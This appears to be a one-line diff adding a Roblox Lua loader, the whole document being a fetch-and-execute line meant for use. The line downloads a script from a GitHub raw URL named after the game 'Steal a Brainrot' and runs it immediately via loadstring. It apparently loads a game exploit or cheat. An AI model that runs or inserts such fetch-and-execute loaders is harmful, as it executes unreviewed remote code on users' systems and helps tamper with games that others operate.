@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DaRealLBNH/StealABrainrotProtected/refs/heads/main/Main"))()
